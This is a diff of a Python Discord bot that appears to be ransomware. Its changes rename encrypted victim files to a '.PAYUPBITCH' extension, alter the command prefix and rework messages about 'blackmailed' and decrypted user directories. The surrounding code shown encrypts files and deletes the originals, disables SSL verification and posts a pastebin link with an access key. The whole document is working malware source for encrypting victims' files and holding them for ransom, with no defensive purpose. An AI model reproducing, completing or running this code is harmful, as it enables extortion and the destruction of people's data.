@@ -1,7 +1,7 @@
 #
 # 
 #      MADE BY COOKIESKUSH420#3617
-#  if your reading thing hello there <3
+#  if your reading this hello there <3
 #
 #
 import discord , asyncio , ctypes , os , base64 , string , random , webbrowser
@@ -24,7 +24,7 @@ token = 'DISCORD_TOKEN_HERE'
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
-bot = commands.Bot(command_prefix='?')
+bot = commands.Bot(command_prefix='!')
 ssl._create_default_https_context = ssl._create_unverified_context
 helpmenu = """
 Availaible commands are :
@@ -81,7 +81,7 @@ def enc_fun(key,file):
         fl,ext = os.path.splitext(file)
         fkey = f(key)
         enc = fkey.encrypt(data)
-        with open(str(fl[0:])+ext+'.en','wb') as encfile:
+        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
             encfile.write(enc)
         os.remove(file)
     except:
@@ -385,7 +385,7 @@ async def on_message(message):
                                     listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                     for l in listOfFiles:
                                         EXTENSIONSS = (
-                                            '.en',
+                                            '.PAYUPBITCH',
                                         )
                                         if l.endswith(EXTENSIONSS):
                                             import threading
@@ -396,7 +396,7 @@ async def on_message(message):
                                             pass
                     else:
                         dec_fun(password(passwd),file_input)                
-                    await message.channel.send(f"Unblackmailed user DIR ```{usersdir}``` with key ```{passwd}```")
+                    await message.channel.send(f"Decrypted user DIR ```{usersdir}```")
                 else:                             
                     await message.channel.send(f"**Please enter a DIR!**")
             else:           
@@ -425,7 +425,7 @@ async def on_message(message):
 
         if message.content == "!help":
 
-            await message.channel.send("https://pastebin.com/GaJbwS3Y **Key for pastebin is ```3xcst-ZbtU$AMMz8rW}bDk3&e```")
+            await message.channel.send("https://pastebin.com/GaJbwS3Y **Key for pastebin is** ```3xcst-ZbtU$AMMz8rW}bDk3&e```")
 
             # import os
             # temp = (os.getenv('TEMP'))
